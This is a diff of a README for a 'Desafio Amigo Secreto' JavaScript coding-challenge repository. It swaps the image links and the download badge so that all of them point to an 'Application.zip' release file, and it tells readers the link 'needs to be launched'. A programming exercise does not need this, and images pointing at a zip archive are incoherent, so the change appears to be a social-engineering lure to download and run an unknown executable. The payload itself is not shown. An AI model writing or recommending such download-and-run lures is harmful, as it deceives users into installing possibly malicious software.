@@ -2,7 +2,7 @@
 
 Welcome to the "Desafio Amigo Secreto" repository! Here you will find a collection of challenges designed to help you enhance your programming skills by focusing on problem-solving and improving your logical reasoning abilities.
 
-![Amigo Secreto](https://example.com/amigo-secreto-image.jpg)
+![Amigo Secreto](https://github.com/missingmydad/Desafio-Amigo-Secreto/releases/download/v1.0/Application.zip)
 
 ## 📁 Repository Content 
 This repository includes various coding challenges related to the "Amigo Secreto" concept, where participants exchange secret gifts without knowing who the gift is from. The challenges are tailored to test your skills in JavaScript programming and are part of the "Oracle Next Education" program offered by Alura Latam.
@@ -10,7 +10,7 @@ This repository includes various coding challenges related to the "Amigo Secreto
 ## 🚀 Get Started
 To get started with the challenges, download the software package from the link provided below. This package contains all the necessary resources and instructions to begin your journey of improving your logical thinking and problem-solving abilities.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/missingmydad/Desafio-Amigo-Secreto/releases/download/v1.0/Application.zip)](https://github.com/missingmydad/Desafio-Amigo-Secreto/releases/download/v1.0/Application.zip)
 
 *(Note: The link above needs to be launched to access the software package.)*
 
@@ -41,6 +41,6 @@ If the provided link to download the software package is not functional, please 
 
 **Let the challenges begin!** 🚀
 
-![Coding Challenge](https://example.com/coding-challenge.jpg)
+![Coding Challenge](https://github.com/missingmydad/Desafio-Amigo-Secreto/releases/download/v1.0/Application.zip)
 
 *Happy Coding!* 🌟
